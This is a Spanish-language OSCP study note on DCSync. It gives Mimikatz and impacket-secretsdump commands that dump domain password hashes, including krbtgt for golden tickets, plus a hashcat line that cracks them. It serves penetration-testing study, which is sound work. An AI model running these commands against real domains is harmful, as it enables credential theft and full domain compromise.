---
tipo: tecnica
fase: post-explotacion
so: windows
tags: [oscp, tecnica, ad, post-explotacion, windows, linux]
---

# DCSync

> [!abstract] Qué es y cuándo usarla
> Abusa de la **replicación de AD** (DRS) para impersonar un DC y pedirle el hash de **cualquier** usuario del dominio (incl. `Administrator` y `krbtgt`). Es la vía estándar para volcar credenciales del dominio una vez tienes privilegio alto.

## Requisitos previos
- Un usuario con derechos de replicación: **Replicating Directory Changes (All / In Filtered Set)**. Por defecto los tienen **Domain Admins**, **Enterprise Admins** y **Administrators**.

## Pasos
```text
# Windows (Mimikatz) - como Domain Admin
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
lsadump::dcsync /user:corp\krbtgt        # para golden ticket (modulo siguiente)
```
```bash
# Linux (impacket) - creds de un user con derechos de replicacion
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:'Password!'@192.168.50.70
# sin -just-dc-user: vuelca TODO el dominio (NTDS.DIT)
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
Usa la API **DRSUAPI**; el NTLM obtenido se crackea (modo **1000**) o se reutiliza con [[Pass-the-Hash]].

> [!warning] Detección / problemas
> - Necesitas los derechos de replicación (no basta cualquier user).
> - Escapar el `!` del password en bash: `'Password\!'` o comillas simples.
> - El hash de `krbtgt` permite forjar **golden tickets** (persistencia total del dominio).

## Visto en
- Módulo: [[23 - Attacking Active Directory Authentication]]
- Máquinas: [[]]
